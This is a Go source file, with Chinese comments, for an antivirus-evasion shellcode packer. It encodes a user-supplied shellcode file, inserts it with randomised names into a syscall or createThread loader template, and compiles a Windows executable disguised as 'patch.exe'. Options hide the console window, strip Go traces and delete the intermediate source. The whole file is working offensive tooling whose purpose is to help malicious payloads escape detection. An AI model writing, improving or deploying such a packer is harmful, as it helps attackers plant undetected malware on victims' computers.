package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	key          []byte
	keys         string
	keyName      string
	decodeName   string
	genName      string
	gd           string
	bbdataName   string
	shellCodeHex string
	bdata        string
)

var path = "payload.bin"
var tmplMap = make(map[string]string)

var path1 string
var hide1 string
var gostrip1 string
var isRm1 string
var tpl string
var hide = true
var gostrip bool
var isRm = true
var tmplVal = "syscall"

const tmplHelp = `
1. syscall
2. createThread
`

func init() {
	fmt.Println("[*]初始化混淆参数")
	//初始化key
	key = getKey()
	//key变量名
	keyName = randString(5)
	//解码方法名
	decodeName = randString(6)
	//生成exe方法名
	genName = randString(6)
	//混淆方法名
	gd = randString(6)

	//base64变量
	bbdataName = randString(4)

	shellCodeHex = randString(4)

	tmplMap["1"] = "syscall"
	tmplMap["2"] = "createThread"
}

func getKey() []byte {
	keys = randString(2)
	b := []byte(keys)
	return b
}

func randString(l int) string {
	str := "abcdefghijklmnopqrstuvwxyz_"
	bytes := []byte(str)
	result := []byte{}
	x := time.Now().UnixNano() * 6
	y := time.Now().UnixNano() * 4
	r := rand.New(rand.NewSource(x + y))
	time.Sleep(1000)
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	ddd := string(result)
	fmt.Println(ddd)
	return ddd
}

func getEnCode(data []byte) string {
	bdata1 := base64.StdEncoding.EncodeToString(data)
	bydata1 := []byte(bdata1)
	var shellcode []byte

	for i := 0; i < len(bydata1); i++ {
		shellcode = append(shellcode, bydata1[i]+key[0]-key[1])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

func gen(code *string) {
	//payload
	*code = strings.ReplaceAll(*code, "$bdata", bdata)
	//payload名
	*code = strings.ReplaceAll(*code, "$bbdata", bbdataName)
	*code = strings.ReplaceAll(*code, "$keyName", keyName)
	*code = strings.ReplaceAll(*code, "$keys", keys)
	*code = strings.ReplaceAll(*code, "$shellCodeHex", shellCodeHex)
	*code = strings.ReplaceAll(*code, "$gd", gd)
	//*code=strings.ReplaceAll(*code, "$gdNum", ss)
	*code = strings.ReplaceAll(*code, "$genEXE", genName)
	*code = strings.ReplaceAll(*code, "$getDeCode", decodeName)

}

func main() {

	var m bool
	if len(os.Args) == 2 {
		fp := os.Args[1]
		_, err := os.Stat(fp)
		if err == nil {
			m = true
		}
	}

	//高级模式
	if !m {
		fmt.Println("[*]请输入shellcode路径 [默认./payload.bin]")
		fmt.Scanln(&path1)
		if strings.TrimSpace(path1) != "" {
			path = path1
		}
		fmt.Println("[*]请输入免杀方式 [1]")
		fmt.Println(tmplHelp)
		fmt.Scanln(&tpl)
		if strings.TrimSpace(tmplMap[tpl]) != "" {
			tmplVal = tmplMap[tpl]
		}

		fmt.Println("[*]是否隐藏窗口 [Y/n]")
		fmt.Scanln(&hide1)
		if hide1 == "n" {
			hide = false
		}

		fmt.Println("[*]是否去除golang特征 [y/N]")
		fmt.Scanln(&gostrip1)
		if gostrip1 == "y" {
			gostrip = true
		}

		fmt.Println("[*]是否删除生成shellcode [Y/n]")
		fmt.Scanln(&isRm1)
		if isRm1 == "n" {
			isRm = false
		}

	}
	sc, err := ioutil.ReadFile(path)
	if err != nil || len(sc) == 0 {
		fmt.Println("[-]请检查输入shellcode路径!")
		return
	}

	bdata = getEnCode(sc)
	fmt.Println("[+]获取payload", "---->", path)
	//fmt.Println(bdata)
	time.Sleep(1 * time.Second)
	//ioutil.WriteFile("shellcode.txt", []byte(bdata), 0666)
	fmt.Println("[*]解析shellcode模板", "---->", tmplVal)
	time.Sleep(1 * time.Second)
	//tmpl, _ := ioutil.ReadFile("./syscal")
	tmpl, _ := ioutil.ReadFile("template/" + tmplVal)
	code := string(tmpl)
	fmt.Println("[*]生成shellcode", "---->shellcode.go")
	time.Sleep(1 * time.Second)

	gen(&code)
	ioutil.WriteFile("shellcode.go", []byte(code), 0666)

	fmt.Println("[*]编译shellcode")
	time.Sleep(1 * time.Second)

	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o game.exe ./shellcode.go")
	//隐藏窗口，如有需要自行替换
	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
	//CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go
	//outFile :="patch"+string(time.Now().Format("2006-01-02"))+".exe"
	outFile := "patch.exe"
	var cmd exec.Cmd
	if hide {
		cmd = *exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-H windowsgui -s -w", "shellcode.go", "-o game"+outFile)
	} else {
		cmd = *exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-s -w", "shellcode.go", "-o game"+outFile)
	}
	//阻塞至等待命令执行完成
	err1 := cmd.Run()
	if err1 != nil {
		panic(err1)
	}
	fmt.Println("[+]生成" + outFile)
	if isRm {
		os.Remove("shellcode.go")
	}

}
